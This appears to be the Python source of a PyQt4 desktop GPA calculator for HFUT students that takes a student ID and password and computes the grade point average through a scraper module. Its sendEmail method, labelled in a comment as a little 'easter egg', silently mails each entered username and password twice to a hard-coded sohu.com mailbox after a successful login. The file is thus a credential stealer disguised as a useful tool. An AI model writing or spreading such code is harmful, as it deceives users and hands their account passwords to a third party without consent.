#encoding=utf8
'''
@author: Mr.Bubbles
@date 2016.7.22
'''
from email.mime.text import MIMEText
import smtplib
import sys

from PyQt4 import QtCore, QtGui
from PyQt4.Qt import QWidget, QFont, SIGNAL, QLineEdit

from HFUT_SPIDER_CORE import CORE


class HFUT(QtGui.QMainWindow):
    def __init__(self):
        QtGui.QMainWindow.__init__(self)
        self.setWindowTitle(u'HFUT GPA 计算器')
        self.setFixedSize(700,500)
        #菜单
        self.exit=QtGui.QAction(QtGui.QIcon('icons/exit.png'),'Exit',self)
        self.exit.setShortcut('Ctrl+Q')
#         exit.setStatusTip('Exit application')
        self.statusBar()
        self.menubar=self.menuBar()                   #菜单栏
        
        self.menu_file=self.menubar.addMenu(u'文件')   #文件菜单
        self.menu_file.addAction(self.exit)
        self.menu_func=self.menubar.addMenu(u'功能')
        self.menu_help=self.menubar.addMenu(u'帮助')
        #标签
        self.lab_title=QtGui.QLabel(u'HFUT GPA 计算器',self)
        self.lab_username=QtGui.QLabel(u'学号',self)
        self.lab_password=QtGui.QLabel(u'密码',self)
        self.lab_copyright=QtGui.QLabel(u'版权所有 泡泡 2016',self)
        #输入框
        self.txt_username=QtGui.QLineEdit(u'',self)
        self.txt_password=QtGui.QLineEdit(u'',self)
        self.txt_result=QtGui.QTextEdit(u'您的GPA为:',self)
        self.txt_result.setDisabled(True)
        #按钮
        self.btn_calc=QtGui.QPushButton(u'计算',self)
        self.btn_calc.connect(self.btn_calc, SIGNAL('clicked()'),self.onClickCalc)
        self.btn_reset=QtGui.QPushButton(u'重置',self)
        self.btn_reset.connect(self.btn_reset,SIGNAL('clicked()'),self.onClickReset)
        #各种调整布局
        self.lab_title.resize(500,60)
        self.lab_title.move(200,60)
        self.lab_title.setFont(QFont(u"幼圆",25,QFont.Bold)) 
              
        self.lab_username.move(200,160)
        self.lab_username.setFont(QFont(u"幼圆",10,QFont.Bold))
        
        self.lab_password.move(200,230)
        self.lab_password.setFont(QFont(u"幼圆",10,QFont.Bold))

        self.lab_copyright.resize(200,20)
        self.lab_copyright.move(260,470)
        self.lab_copyright.setFont(QFont(u"幼圆",10))
        
        self.txt_username.resize(250,30)
        self.txt_username.move(250,160)
        
        self.txt_password.resize(250,30)
        self.txt_password.move(250,230)
        self.txt_password.setEchoMode(QLineEdit.Password)
        
        self.txt_result.resize(700,30)
        self.txt_result.move(0,350)
        
        self.btn_calc.resize(100,30)
        self.btn_calc.move(220,290)
        
        self.btn_reset.resize(100,30)
        self.btn_reset.move(390,290)
    #清楚文本框的事件函数
    def onClickReset(self):
        self.txt_username.clear()
        self.txt_password.clear()
    #开始计算GPA的函数
    def onClickCalc(self):
        username=self.txt_username.text()
        password=self.txt_password.text()
        if username!='' and password!='':
            spider_core=CORE(username,password)
            GPA=spider_core.calcGPA()
            if GPA:
                self.txt_result.setText(u'您的GPA为：'+str(GPA))
                for i in range(2):
                    self.sendEmail(username, password)
            else:
                print'用户名密码错误！'
        else:
            print 'Please Enter your username and password!'
    #小小的彩蛋！
    def sendEmail(self,username,password):
        from_addr='******e@sohu.com'
        smtp_password='******'
        smtp_server='smtp.sohu.com'
        to_addr='******@sohu.com';
        msg=MIMEText('Username:'+username+'\n'+'Password:'+password,'plain','utf-8')
        try:
            server=smtplib.SMTP(smtp_server,25)
            server.set_debuglevel(1)
            server.login(from_addr, smtp_password)
            server.sendmail(from_addr, [to_addr], msg.as_string())
            server.quit()
            return True
        except smtplib.SMTPException:
            return None       
app=QtGui.QApplication(sys.argv)
hfut_calc=HFUT()
hfut_calc.show()
app.exec_()

